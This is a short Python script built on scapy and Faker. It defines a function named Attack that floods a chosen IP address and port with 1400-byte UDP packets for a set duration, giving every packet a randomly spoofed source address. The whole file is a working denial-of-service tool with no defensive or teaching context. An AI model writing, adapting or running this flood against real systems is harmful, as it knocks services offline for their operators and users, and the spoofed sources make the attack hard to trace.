from scapy.all import IP, UDP, send, Raw
from faker import Faker
import random
import time

fake = Faker()
def Attack(dst_ip, dst_port, duration):
    ending = time.time() + duration
    payload = b"X" * 1400
    packets = 0
    while time.time() < ending:
        src_ip = fake.ipv4()
        src_port = random.randint(1024, 65535)

        ip = IP(src=src_ip, dst=dst_ip)
        udp = UDP(sport=src_port, dport=dst_port)
        packet = ip/udp/payload

        send(packet, verbose=False)
        packets += 1
        print(f"sent {packets} packets")